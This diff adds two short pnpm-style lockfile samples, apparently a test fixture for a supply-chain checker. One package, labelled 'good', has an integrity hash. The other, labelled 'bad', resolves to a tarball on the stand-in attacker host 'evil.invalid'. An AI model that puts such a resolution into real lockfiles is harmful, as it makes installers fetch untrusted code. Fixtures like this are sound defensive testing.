@@ -1,0 +1,13 @@
+lockfileVersion: '9.0'
+
+packages:
+
+  good@1.0.0:
+    resolution: {integrity: sha512-x}
+---
+lockfileVersion: '9.0'
+
+packages:
+
+  bad@1.0.0:
+    resolution: {tarball: https://evil.invalid/x.tgz}
